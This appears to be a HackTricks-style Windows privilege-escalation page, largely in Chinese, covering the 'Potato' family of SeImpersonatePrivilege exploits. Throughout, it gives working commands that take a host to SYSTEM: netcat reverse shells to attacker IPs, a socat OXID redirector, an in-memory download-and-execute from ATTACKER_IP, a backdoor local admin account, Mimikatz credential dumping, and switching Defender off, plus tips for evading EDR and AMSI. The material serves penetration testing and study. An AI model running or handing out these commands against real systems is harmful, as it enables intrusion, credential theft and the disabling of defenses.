# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato 在 Windows Server 2019 和 Windows 10 build 1809 及更高版本上不起作用。** 然而，[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** 可用于利用相同的权限并获得 `NT AUTHORITY\SYSTEM` 级别的访问。** 这篇 [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) 详细介绍了 `PrintSpoofer` 工具，该工具可在 JuicyPotato 不再可用的 Windows 10 和 Server 2019 主机上滥用 impersonation 权限。

> [!TIP]
> 一个在 2024–2025 年间频繁维护的现代替代方案是 SigmaPotato（GodPotato 的一个 fork），它加入了内存中/.NET reflection 的用法并扩展了对操作系统的支持。参见下面的快速用法和参考中的仓库。

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements and common gotchas

下面所有技术都依赖于从具有下列任一权限的上下文滥用能够执行模拟（impersonation）的特权服务：

- SeImpersonatePrivilege（最常见）或 SeAssignPrimaryTokenPrivilege
- 如果 token 已经拥有 SeImpersonatePrivilege，则不需要高完整性（High integrity）（这在许多服务账户中很常见，例如 IIS AppPool、MSSQL 等）

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- If your shell runs under a restricted token lacking SeImpersonatePrivilege (common for Local Service/Network Service in some contexts), regain the account’s default privileges using FullPowers, then run a Potato. Example: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer needs the Print Spooler service running and reachable over the local RPC endpoint (spoolss). In hardened environments where Spooler is disabled post-PrintNightmare, prefer RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requires an OXID resolver reachable on TCP/135. If egress is blocked, use a redirector/port-forwarder (see example below). Older builds needed the -f flag.
- EfsPotato/SharpEfsPotato abuse MS-EFSR; if one pipe is blocked, try alternative pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Error 0x6d3 during RpcBindingSetAuthInfo typically indicates an unknown/unsupported RPC authentication service; try a different pipe/transport or ensure the target service is running.
- “Kitchen-sink” forks such as DeadPotato bundle extra payload modules (Mimikatz/SharpHound/Defender off) which touch disk; expect higher EDR detection compared to the slim originals.

## 快速演示

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
注意：
- 你可以使用 -i 在当前控制台启动一个交互式进程，或使用 -c 运行一行命令。
- 需要 Spooler 服务。如果该服务被禁用，则此方法将失败。

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
如果 outbound 135 被阻断，请在你的 redirector 上通过 socat pivot OXID resolver：
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato 是在 2022 年末发布的一个较新的 COM 滥用原语，它针对 **PrintNotify** 服务，而不是 Spooler/BITS。该二进制会实例化 PrintNotify COM 服务器，替换进一个伪造的 `IUnknown`，然后通过 `CreatePointerMoniker` 触发一个特权回调。当 PrintNotify 服务（以 **SYSTEM** 身份运行）回连时，进程会复制返回的 token 并以完整权限生成所提供的 payload。

Key operational notes:

* 在已安装 Print Workflow/PrintNotify service 的情况下适用于 Windows 10/11 以及 Windows Server 2012–2022（即使在 PrintNightmare 之后禁用旧的 Spooler 时，该服务仍然存在）。
* 调用上下文需要拥有 **SeImpersonatePrivilege**（典型场景为 IIS APPPOOL、MSSQL 和计划任务的服务账户）。
* 可接受直接命令或交互模式，以便停留在原始控制台内。示例：

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* 由于它纯粹基于 COM，不需要 named-pipe 监听器或外部重定向器，因此可以作为在 Defender 阻止 RoguePotato 的 RPC binding 的主机上的即插即用替代方案。

像 Ink Dragon 这样的运营者在于 SharePoint 获得 ViewState RCE 后会立即触发 PrintNotifyPotato，从 `w3wp.exe` 工作进程 提权到 SYSTEM，然后再安装 ShadowPad。

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
提示：如果某个 pipe 失败或被 EDR 阻止，请尝试其他受支持的 pipes：
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
说明:
- 在存在 SeImpersonatePrivilege 时适用于 Windows 8/8.1–11 和 Server 2012–2022。

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato 提供两个变体，针对默认使用 RPC_C_IMP_LEVEL_IMPERSONATE 的服务 DCOM 对象。编译或使用提供的 binaries 并运行你的 command:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato（更新的 GodPotato 派生版）

SigmaPotato 添加了现代化的便捷功能，例如 in-memory execution via .NET reflection 和 PowerShell reverse shell helper。
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- 内置 reverse shell 标志 `--revshell`，并移除了 PowerShell 的 1024 字符限制，使你能一次性发送较长的 AMSI-bypassing payloads。
- 采用反射友好的语法 (`[SigmaPotato]::Main()`)，并通过 `VirtualAllocExNuma()` 实现一个简单的 AV 绕过技巧以干扰基础启发式检测。
- 提供单独的 `SigmaPotatoCore.exe`，针对 .NET 2.0 编译，适用于 PowerShell Core 环境。

### DeadPotato (2024 年对 GodPotato 的重构并加入模块)

DeadPotato 保留了 GodPotato 的 OXID/DCOM impersonation chain，但内置了 post-exploitation 辅助工具，使操作者能够立即获取 SYSTEM 并执行 persistence/collection，而无需额外工具。

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — 以 SYSTEM 身份运行任意命令。
- `-rev <ip:port>` — 快速 reverse shell。
- `-newadmin user:pass` — 创建本地管理员以用于 persistence。
- `-mimi sam|lsa|all` — 投放并运行 Mimikatz 以 dump credentials（会接触磁盘，噪声大）。
- `-sharphound` — 以 SYSTEM 身份运行 SharpHound collection。
- `-defender off` — 切换 Defender 实时保护（非常显眼）。

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
因为它随附额外的二进制文件，预计会导致更多 AV/EDR 告警；在需要隐蔽时请使用更精简的 GodPotato/SigmaPotato。

## 参考资料

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
